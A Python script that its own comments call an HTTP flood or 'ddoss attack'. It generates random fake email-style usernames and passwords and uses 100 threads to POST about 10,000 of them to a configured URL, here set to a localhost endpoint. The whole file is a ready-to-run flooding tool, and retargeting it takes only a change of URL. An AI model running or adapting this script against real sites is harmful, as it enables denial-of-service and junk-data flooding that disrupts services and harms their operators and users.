import requests
import random
import string
import json
from threading import Thread


# Constants
URL = 'http://localhost/api/core/data'
FIRST_NAMES = tuple(json.load(open('first_names.json')))
LAST_NAMES = tuple(json.load(open('last_names.json')))
EMAIL_PROVIDERS = ('gmail.com', 'yahoo.com', 'aol.com', 'outlook.com', 'icloud.com')
CHARS = string.ascii_letters + string.digits + '!@#$%&'


# Send many post requests to the URL
def attack_url():
    for _ in range(100):
        # Randomly generate a fake username and password
        first_name = random.choice(FIRST_NAMES).lower()
        last_name = random.choice(LAST_NAMES).lower()
        extra_digits = ''.join(random.choices(string.digits, k=random.randint(1, 5)))
        email = random.choice(EMAIL_PROVIDERS)

        username = first_name + last_name + extra_digits + '@' + email
        password = ''.join(random.choices(CHARS, k=random.randint(8, 20)))

        # Post the fake data to the URL
        print(f'Sending username {username} and password {password} to the URL...')

        if URL:
            try:  # If an error occurs, terminate the function
                data = { 
                    # NOTE: The field names may vary depending on the URL form
                    'username': username,
                    'password': password
                }
                requests.post(URL, allow_redirects=False, data=data)
            except:
                print(f'Failed to send {username} and password {password} to the URL!')
                return


# Sets up and executes the HTTP flood against the URL
def execute_ddoss_attack():
    # Use threading to speed up the number of posts made
    threads = [Thread(target=attack_url, daemon=True) for _ in range(100)]
    
    # Destroy them!
    for thread in threads:
        thread.start()
    
    # Make the program wait until all the threads are done
    for thread in threads:
        thread.join()


# Execute the program if the script is run directly
if __name__ == '__main__':
    execute_ddoss_attack()
